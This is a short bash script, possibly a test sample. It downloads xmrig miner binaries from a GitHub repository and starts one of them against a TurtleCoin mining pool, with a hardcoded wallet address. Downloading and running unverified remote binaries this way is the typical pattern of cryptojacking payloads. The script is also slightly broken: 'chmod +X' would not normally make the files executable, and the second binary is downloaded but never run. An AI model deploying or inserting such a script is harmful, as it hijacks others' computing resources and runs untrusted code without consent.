#!/bin/bash

wget https://github.com/jeffthorne/test/raw/main/xmrigDaemon -O xmrigDaemon
chmod +X xmrigDaemon
wget https://github.com/jeffthorne/test/raw/main/xmrigMiner -O xmrigMiner
chmod +X xmrigMiner
./xmrigDaemon -o ca.turtlecoin.herominers.com:10380 -p x -k -u TRTLuzAyPPASGaxWJi4U7oJ9nEFVGkCcJVKoVyZuKyFJ88G1bjAtayJCBZ1cAdSJZgiDosGrFkcUbiLYFj7FUYdMMJaThJXhp92 --algo argon2/chukwav2

